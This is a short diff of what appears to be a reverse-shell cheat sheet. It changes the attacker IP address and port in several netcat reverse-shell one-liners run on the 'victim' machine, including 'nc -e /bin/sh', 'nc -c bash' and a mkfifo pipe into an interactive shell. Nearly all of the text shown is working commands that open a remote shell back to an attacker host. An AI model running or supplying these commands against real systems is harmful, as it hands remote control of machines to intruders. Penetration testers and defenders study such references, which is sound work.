@@ -10,13 +10,13 @@ Attacker listening:
 ```
 Victim:
 ```bash
-# nc -e /bin/sh 10.0.0.1 4242
-# nc -e /bin/bash 10.0.0.1 4242
-# nc -c bash 10.0.0.1 4242
+# nc -e /bin/sh 192.168.1.10 4444
+# nc -e /bin/bash 192.168.1.10 4444
+# nc -c bash 192.168.1.10 4444
 ```
-If the victim `netcat` version does not support `-e`, use:
+If the victim `netcat` version does not support `-e`, try to use:
 ```bash
-# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 4444 >/tmp/f
 ```
 
 ### Python
